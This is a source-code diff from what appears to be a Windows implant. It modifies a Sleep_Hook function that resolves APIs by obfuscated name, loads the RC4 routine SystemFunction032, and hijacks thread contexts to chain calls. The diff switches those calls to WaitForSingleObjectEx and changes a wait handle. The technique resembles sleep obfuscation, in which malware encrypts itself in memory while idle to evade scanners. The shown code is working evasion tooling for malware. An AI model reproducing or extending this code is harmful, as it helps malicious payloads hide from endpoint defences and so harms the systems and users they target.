@@ -43,10 +43,10 @@ typedef struct
 	D_API( SetThreadpoolThreadMaximum );
 	D_API( SetThreadpoolThreadMinimum );
 	D_API( LdrGetProcedureAddress );
+	D_API( WaitForSingleObjectEx );
 	D_API( NtWaitForSingleObject );
 	D_API( RtlInitUnicodeString );
 	D_API( RtlCreateTimerQueue );
-	D_API( WaitForSingleObject );
 	D_API( RtlDeleteTimerQueue );
 	D_API( NtGetContextThread );
 	D_API( NtSetContextThread );
@@ -398,8 +398,8 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMinimum" ) ) );
 			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMinimum );
 
-			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObject" ) ) );
-			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObject );
+			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObjectEx" ) ) );
+			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObjectEx );
 
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SystemFunction032" ) ) );
 			Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );
@@ -511,10 +511,11 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 
 								__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
 								Beg->ContextFlags = CONTEXT_FULL;
-								Beg->Rip  = U_PTR( Api.WaitForSingleObject );
+								Beg->Rip  = U_PTR( Api.WaitForSingleObjectEx );
 								Beg->Rsp -= sizeof( PVOID );
 								Beg->Rcx  = U_PTR( Ev2 );
 								Beg->Rdx  = U_PTR( INFINITE );
+								Beg->R8   = U_PTR( FALSE );
 
 								__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
 								Set->ContextFlags = CONTEXT_FULL;
@@ -534,10 +535,11 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 
 								__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
 								Blk->ContextFlags = CONTEXT_FULL;
-								Blk->Rip  = U_PTR( Api.WaitForSingleObject );
+								Blk->Rip  = U_PTR( Api.WaitForSingleObjectEx );
 								Blk->Rsp -= sizeof( PVOID );
-								Blk->Rcx  = U_PTR( NtCurrentProcess() );
+								Blk->Rcx  = U_PTR( Ev3 );
 								Blk->Rdx  = U_PTR( DelayTime );
+								Blk->R8   = U_PTR( FALSE );
 
 								__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
 								Dec->ContextFlags = CONTEXT_FULL;
